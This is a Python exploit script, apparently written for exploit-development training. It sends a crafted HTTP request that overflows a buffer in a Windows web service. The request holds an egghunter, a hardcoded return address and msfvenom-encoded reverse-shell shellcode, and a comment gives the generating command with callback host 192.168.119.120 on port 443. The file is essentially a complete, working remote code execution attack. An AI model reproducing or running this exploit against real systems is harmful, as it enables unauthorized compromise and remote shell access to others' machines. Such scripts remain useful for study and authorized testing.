#!/usr/bin/python
import socket
import sys 
from struct import pack

# generate shell code msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 -f c â€“e x86/shikata_ga_nai -b "\x0d\x00\x0a\x25"

try:
    server = sys.argv[1]
    port = 80
    size = 260
    #bad characters \x0d \x00 \x0a \x25
    httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"
    inputBuffer = b"\x90"*8
    EGGHUNTER = bytearray(
    b"\x66\x81\xCA\xFF\x0F\x42\x52\x33\xC0\x66\xB8"
    b"\xC6\x01"
    b"\xCD\x2E\x3C\x05\x5A\x74\xEC\xB8"
    b"Guru"
    b"\x8B\xFA\xAF\x75\xE7\xAF\x75\xE4\xFF\xE7")
    inputBuffer += EGGHUNTER
    inputBuffer += b"\x41" * (253 - len(inputBuffer))
    inputBuffer += pack("<L", (0x418674)) # point to pop eax ret - 00418674
    httpEndRequest = b"\r\n\r\n"
    shellcode = b"GuruGuru" + b"\x90" * 8
    shellcode += b"\xb8\x45\x8f\x9d\x38\xdd\xc2\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
    shellcode += b"\x52\x83\xc7\x04\x31\x47\x0e\x03\x02\x81\x7f\xcd\x70\x75\xfd"
    shellcode += b"\x2e\x88\x86\x62\xa6\x6d\xb7\xa2\xdc\xe6\xe8\x12\x96\xaa\x04"
    shellcode += b"\xd8\xfa\x5e\x9e\xac\xd2\x51\x17\x1a\x05\x5c\xa8\x37\x75\xff"
    shellcode += b"\x2a\x4a\xaa\xdf\x13\x85\xbf\x1e\x53\xf8\x32\x72\x0c\x76\xe0"
    shellcode += b"\x62\x39\xc2\x39\x09\x71\xc2\x39\xee\xc2\xe5\x68\xa1\x59\xbc"
    shellcode += b"\xaa\x40\x8d\xb4\xe2\x5a\xd2\xf1\xbd\xd1\x20\x8d\x3f\x33\x79"
    shellcode += b"\x6e\x93\x7a\xb5\x9d\xed\xbb\x72\x7e\x98\xb5\x80\x03\x9b\x02"
    shellcode += b"\xfa\xdf\x2e\x90\x5c\xab\x89\x7c\x5c\x78\x4f\xf7\x52\x35\x1b"
    shellcode += b"\x5f\x77\xc8\xc8\xd4\x83\x41\xef\x3a\x02\x11\xd4\x9e\x4e\xc1"
    shellcode += b"\x75\x87\x2a\xa4\x8a\xd7\x94\x19\x2f\x9c\x39\x4d\x42\xff\x55"
    shellcode += b"\xa2\x6f\xff\xa5\xac\xf8\x8c\x97\x73\x53\x1a\x94\xfc\x7d\xdd"
    shellcode += b"\xdb\xd6\x3a\x71\x22\xd9\x3a\x58\xe1\x8d\x6a\xf2\xc0\xad\xe0"
    shellcode += b"\x02\xec\x7b\xa6\x52\x42\xd4\x07\x02\x22\x84\xef\x48\xad\xfb"
    shellcode += b"\x10\x73\x67\x94\xbb\x8e\xe0\x5b\x93\xa1\x93\x33\xe6\xc1\x52"
    shellcode += b"\x7f\x6f\x27\x3e\x6f\x26\xf0\xd7\x16\x63\x8a\x46\xd6\xb9\xf7"
    shellcode += b"\x49\x5c\x4e\x08\x07\x95\x3b\x1a\xf0\x55\x76\x40\x57\x69\xac"
    shellcode += b"\xec\x3b\xf8\x2b\xec\x32\xe1\xe3\xbb\x13\xd7\xfd\x29\x8e\x4e"
    shellcode += b"\x54\x4f\x53\x16\x9f\xcb\x88\xeb\x1e\xd2\x5d\x57\x05\xc4\x9b"
    shellcode += b"\x58\x01\xb0\x73\x0f\xdf\x6e\x32\xf9\x91\xd8\xec\x56\x78\x8c"
    shellcode += b"\x69\x95\xbb\xca\x75\xf0\x4d\x32\xc7\xad\x0b\x4d\xe8\x39\x9c"
    shellcode += b"\x36\x14\xda\x63\xed\x9c\xea\x29\xaf\xb5\x62\xf4\x3a\x84\xee"
    shellcode += b"\x07\x91\xcb\x16\x84\x13\xb4\xec\x94\x56\xb1\xa9\x12\x8b\xcb"
    shellcode += b"\xa2\xf6\xab\x78\xc2\xd2"
    buf = httpMethod + inputBuffer +  httpEndRequest + shellcode
    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()
    print("Done!")
except socket.error:
    print("Could not connect!")